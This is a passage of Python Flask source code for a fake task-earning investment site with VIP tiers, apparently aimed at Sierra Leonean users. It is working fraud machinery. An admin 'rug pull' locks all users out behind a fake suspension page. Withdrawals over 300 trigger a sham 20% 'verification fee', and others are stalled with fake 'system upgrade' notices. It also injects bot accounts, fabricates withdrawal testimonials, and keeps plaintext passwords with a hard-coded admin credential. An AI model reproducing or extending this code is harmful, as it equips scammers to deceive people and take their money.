            <button class="success" onclick="resetSystem()">Complete System Reset</button>
        </div>
    </div>
    
    <script>
        async function rugPull() {
            if(confirm('WARNING: This will lock ALL users out of the system permanently!')) {
                await fetch('/admin/rug_pull', {method: 'POST'});
                alert('Rug pull executed! System is now locked.');
                location.reload();
            }
        }
        async function injectBots() {
            let res = await fetch('/admin/inject_bots', {method: 'POST'});
            let data = await res.json();
            alert('Added ' + data.bots_added + ' bot users to the system');
            location.reload();
        }
        async function resetSystem() {
            if(confirm('THIS WILL DELETE EVERYTHING! All users, balances, and logs will be lost. Continue?')) {
                await fetch('/admin/reset', {method: 'POST'});
                alert('System has been completely reset. Redirecting to login...');
                location.href = '/login';
            }
        }
    </script>
</body>
</html>
'''

RUG_PULL = '''
<!DOCTYPE html>
<html>
<head>
    <title>System Error</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #8b0000, #dc143c);
            color: white;
            min-height: 100vh;
        }
        .container { max-width: 500px; margin: 100px auto; }
        h1 { font-size: 52px; margin-bottom: 25px; }
        button {
            padding: 16px 35px;
            background: white;
            color: #c00;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-top: 35px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Account Suspended</h1>
        <p>System maintenance in progress. Please contact support.</p>
        <button onclick="location.href='/login'">Return to Login</button>
    </div>
</body>
</html>
'''

def add_log(user_id, action, amount=0):
    log = ActivityLog(user_id=user_id, action=action, amount=amount)
    db.session.add(log)
    db.session.commit()

@app.route('/')
def index():
    total_users = User.query.count()
    total_paid = db.session.query(db.func.sum(User.phantom_balance)).scalar() or 0
    return render_template_string(FRONT_PAGE, users=total_users, total_paid=total_paid)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone')
        password = request.form.get('password')
        user = User.query.filter_by(phone=phone, password=password).first()
        if user:
            if SystemState.query.first().is_rug_pulled:
                return RUG_PULL
            session['user_id'] = user.id
            add_log(user.id, f"User {phone} logged in")
            return redirect(url_for('admin' if user.is_admin else 'dashboard'))
        return render_template_string(LOGIN_PAGE, error='Invalid credentials')
    return render_template_string(LOGIN_PAGE)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        phone = request.form.get('phone')
        password = request.form.get('password')
        if User.query.filter_by(phone=phone).first():
            return render_template_string(REGISTER_PAGE, error='Phone already registered')
        user = User(phone=phone, password=password, phantom_balance=10.0)
        db.session.add(user)
        db.session.commit()
        add_log(user.id, f"New user registered: {phone}")
        session['user_id'] = user.id
        return redirect(url_for('dashboard'))
    return render_template_string(REGISTER_PAGE)

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = User.query.get(session['user_id'])
    if user.is_admin:
        return redirect(url_for('admin'))
    
    if user.phantom_balance >= 2000:
        vip_level, tasks_max, commission = "VIP 3 - Elite", 15, 100
    elif user.phantom_balance >= 500:
        vip_level, tasks_max, commission = "VIP 2 - Premium", 10, 20
    elif user.phantom_balance >= 100:
        vip_level, tasks_max, commission = "VIP 1 - Standard", 5, 4
    else:
        vip_level, tasks_max, commission = "VIP 0 - Basic", 1, 0.5
    
    today = str(date.today())
    tasks_done = user.daily_tasks_done if user.last_task_date == today else 0
    
    return render_template_string(DASHBOARD_PAGE, user=user, vip_level=vip_level, 
                                   tasks_max=tasks_max, tasks_done=tasks_done, commission=commission)

@app.route('/logs')
def view_logs():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    logs = ActivityLog.query.order_by(ActivityLog.id.desc()).limit(100).all()
    return render_template_string(LOGS_PAGE, logs=logs, total_logs=len(logs))

@app.route('/deposit', methods=['POST'])
def deposit():
    user = User.query.get(session['user_id'])
    amount = float(request.form.get('amount', 0))
    if amount > 0:
        user.phantom_balance += amount
        state = SystemState.query.first()
        state.system_liquidity += amount
        state.total_deposits += amount
        db.session.commit()
        add_log(user.id, f"Deposited {amount} NLE", amount)
    return redirect(url_for('dashboard'))

@app.route('/complete_task')
def complete_task():
    user = User.query.get(session['user_id'])
    
    if user.phantom_balance >= 2000:
        commission, max_tasks = 100, 15
    elif user.phantom_balance >= 500:
        commission, max_tasks = 20, 10
    elif user.phantom_balance >= 100:
        commission, max_tasks = 4, 5
    else:
        commission, max_tasks = 0.5, 1
    
    today = str(date.today())
    
    if user.last_task_date == today and user.daily_tasks_done >= max_tasks:
        return jsonify({'success': False, 'error': 'Daily task limit reached. Come back tomorrow!'})
    
    user.phantom_balance += commission
    if user.last_task_date != today:
        user.daily_tasks_done = 1
        user.last_task_date = today
    else:
        user.daily_tasks_done += 1
    db.session.commit()
    
    add_log(user.id, f"Completed task - earned {commission} NLE", commission)
    return jsonify({'success': True, 'commission': commission})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    user = User.query.get(session['user_id'])
    amount = float(request.form.get('amount', 0))
    state = SystemState.query.first()
    total_phantom = db.session.query(db.func.sum(User.phantom_balance)).scalar() or 0
    
    if amount > 300:
        return jsonify({'success': False, 'tax_trap': True, 
                       'message': 'Security Alert: To release this withdrawal, you must deposit a 20% network verification fee.', 
                       'fee': amount * 0.2})
    
    if state.system_liquidity < (total_phantom * 0.3):
        return jsonify({'success': False, 
                       'message': 'System upgrade in progress. Please try again in 72 hours.'})
    
    if amount < 100:
        return jsonify({'success': False, 'message': f'Minimum withdrawal is 100 NLE'})
    
    if amount > user.phantom_balance:
        return jsonify({'success': False, 'message': 'Insufficient balance'})
    
    if amount > state.system_liquidity:
        return jsonify({'success': False, 'message': 'System liquidity insufficient. Try a smaller amount.'})
    
    user.phantom_balance -= amount
    state.system_liquidity -= amount
    state.total_withdrawals += amount
    db.session.commit()
    
    add_log(user.id, f"Withdrew {amount} NLE", amount)
    return jsonify({'success': True})

@app.route('/admin')
def admin():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = User.query.get(session['user_id'])
    if not user.is_admin:
        return redirect(url_for('dashboard'))
    
    total_phantom = db.session.query(db.func.sum(User.phantom_balance)).scalar() or 0
    state = SystemState.query.first()
    users_count = User.query.count()
    logs_count = ActivityLog.query.count()
    ratio = total_phantom / state.system_liquidity if state.system_liquidity > 0 else 0
    
    stats = {
        'total_phantom': f'{total_phantom:.2f}',
        'liquidity': f'{state.system_liquidity:.2f}',
        'ratio': ratio,
        'users': users_count,
        'logs': logs_count
    }
    return render_template_string(ADMIN_PAGE, stats=stats)

@app.route('/admin/rug_pull', methods=['POST'])
def admin_rug_pull():
    state = SystemState.query.first()
    state.is_rug_pulled = True
    db.session.commit()
    add_log(0, "EMERGENCY: System locked by admin", 0)
    return jsonify({'success': True})

@app.route('/admin/inject_bots', methods=['POST'])
def admin_inject_bots():
    for i in range(20):
        bot = User(phone=f'077{i:05d}', password='bot123', phantom_balance=50)
        db.session.add(bot)
        add_log(0, f"Bot user {f'077{i:05d}'} injected into system", 50)
    db.session.commit()
    return jsonify({'success': True, 'bots_added': 20})

@app.route('/admin/reset', methods=['POST'])
def admin_reset():
    db.drop_all()
    db.create_all()
    admin = User(phone='076000000', password='admin123', is_admin=True, phantom_balance=1000)
    db.session.add(admin)
    db.session.add(SystemState(system_liquidity=1000))
    db.session.commit()
    session.clear()
    return jsonify({'success': True})

@app.route('/api/social_proof')
def social_proof():
    prefixes = ['076', '077', '031', '088']
    actions = [
        f'User +232 {random.choice(prefixes)}****** just upgraded to VIP {random.randint(1,3)}!',
        f'User +232 {random.choice(prefixes)}****** successfully withdrew {random.randint(100,2000)} NLE!',
        f'New milestone: User +232 {random.choice(prefixes)}****** earned {random.randint(500,5000)} NLE today!',
        f'{random.randint(10,50)} new users joined in the last hour!',
        f'VIP {random.randint(1,3)} unlocked by +232 {random.choice(prefixes)}******!'
    ]
    return jsonify({'message': random.choice(actions)})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
